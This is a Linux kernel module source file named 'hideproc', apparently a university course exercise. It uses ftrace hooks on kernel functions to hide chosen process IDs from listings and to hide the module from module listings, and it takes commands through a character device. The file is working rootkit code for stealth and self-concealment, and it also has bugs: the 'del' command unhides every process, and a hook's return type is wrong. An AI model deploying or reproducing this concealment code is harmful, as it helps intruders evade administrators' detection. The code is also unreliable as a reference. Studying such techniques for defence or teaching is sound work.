#include "utils.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
typedef struct module *(*find_module_all_func)(const char *name, size_t len,
				                                bool even_unformed);
typedef int (*find_m_show)(struct seq_file *m, void *p);

static find_ge_pid_func real_find_ge_pid;
static find_module_all_func real_find_module_all;
static find_m_show real_m_show;

static struct ftrace_hook module_hook, m_show_hook, ge_pid_hook;

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        if (proc->id == pid)
            return true;
    }
    return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    /* First we get the orig return pid from find_ge_pid() */
    struct pid *pid = real_find_ge_pid(nr, ns);
    /* Next we check whether the pid is in hidden_proc list,
        if it is, return pid greater than or equal nr+1 and
        not hidden instead of return the pid of hidden proc. */
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

#define MODULE_NAME "hideproc_m"

static struct module *hook_find_module_all(const char *name, size_t len,
                                            bool even_unformed)
{
    if (!strcmp(name, MODULE_NAME))
        return NULL;

    return real_find_module_all(name, len, even_unformed);
}

static int *hook_m_show(struct seq_file *m, void *p)
{
    struct module *mod = list_entry(p, struct module, list);

    if (!strcmp(mod->name, MODULE_NAME))
        return 0;
    return real_m_show(m, p);
}

static void init_hook(void)
{
    if (init_kallsyms() != 0)
        return;
    
    real_find_module_all = kallsyms_lookup_name("find_module_all");
    printk(KERN_INFO "find_module_all: %lx\n", real_find_module_all);
    module_hook.name = "find_module_all";
    module_hook.func = hook_find_module_all; /* hook function */
    module_hook.orig = &real_find_module_all; /* real function */
    hook_install(&module_hook);

    real_find_ge_pid = kallsyms_lookup_name("find_ge_pid");
    printk(KERN_INFO "find_ge_pid: %lx\n", real_find_ge_pid);
    ge_pid_hook.name = "find_ge_pid";
    ge_pid_hook.func = hook_find_ge_pid; /* hook function */
    ge_pid_hook.orig = &real_find_ge_pid; /* real function */
    hook_install(&ge_pid_hook);

    real_m_show = kallsyms_lookup_name("m_show");
    printk(KERN_INFO "m_show: %lx\n", real_m_show);
    m_show_hook.name = "m_show";
    m_show_hook.func = hook_m_show; /* hook function */
    m_show_hook.orig = &real_m_show; /* real function */
    hook_install(&m_show_hook);
}

static int hide_process(pid_t pid)
{
    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    list_add_tail(&proc->list_node, &hidden_proc); /* add a new node to tail of list_head */
    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        list_del(&proc->list_node);
        kfree(proc);
    }
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 0x10)

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

/* called when user read something from device */
static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    /* copy all proc pid of hidden procs to user */
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

/* called when user write something into device */
static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;

    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);

    if (!memcmp(message, add_message, sizeof(add_message) - 1)) { /* add <pid> */
        char *pid_list = message + sizeof(add_message);
        char **ptr = &pid_list;
        char *cur;

        while ((cur = strsep(ptr, " ")) != NULL) {
            if (strlen(cur) && !kstrtol(cur, 10, &pid)) {
                printk(KERN_INFO "[add] get pid: %ld\n", pid);
                hide_process(pid);
            }
        }
    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) { /* del <pid> */
        char *pid_list = message + sizeof(del_message);
        char **ptr = &pid_list;
        char *cur;

        while ((cur = strsep(ptr, " ")) != NULL) {
            if (strlen(cur) && !kstrtol(cur, 10, &pid)) {
                printk(KERN_INFO "[del] get pid: %ld\n", pid);
                unhide_process(pid);
            }
        }
    } else {
        kfree(message);
        return -EAGAIN;
    }

    *offset = len;
    kfree(message);
    return len;
}

static dev_t dev;
static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

static int _hideproc_init(void) /* init_function */
{
    int err, dev_major;
    printk(KERN_INFO "Init @ %s\n", __func__);

    /* alloc_chrdev_region - register a range of char device numbers */
    /* dev will get dynamical device id */
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
    dev_major = MAJOR(dev); /* get device major */

    /* create a struct class structure */
    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME); /* (owner, name) */

    cdev_init(&cdev, &fops); /* initialize a cdev structure */
    /* MKDEV(ma,mi) - get device */
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1); /* add a char device to the system */

    /* creates a device and registers it with sysfs */
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                  DEVICE_NAME);

    init_hook(); /* use ftrace_hook to hook function find_ge_pid */
    return 0;
}

/**
 * _hideproc_exit() - reset ftrace hook and clear device
 */
static void _hideproc_exit(void)
{
    printk(KERN_INFO "@ %s\n", __func__);
    /* free all memory */
    pid_node_t *proc, *tmp_proc;
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        list_del(&proc->list_node);
        kfree(proc);
    }
    /* remove ftrace hook */
    hook_remove(&module_hook);
    hook_remove(&ge_pid_hook);
    hook_remove(&m_show_hook);
    /* removes a device that was created with device_create() */
    device_destroy(hideproc_class, MKDEV(MAJOR(dev), MINOR_VERSION));
    cdev_del(&cdev); /* remove a cdev from the system */;
    class_destroy(hideproc_class); /* destroys a struct class structure */
    /* unregister a range of device numbers */
    unregister_chrdev_region(&dev, MINOR_VERSION);
}

module_init(_hideproc_init); /* set function _hideproc_init as init_function */
module_exit(_hideproc_exit); /* set function _hideproc_exit as exit_function */
MODULE_INFO(livepatch, "Y");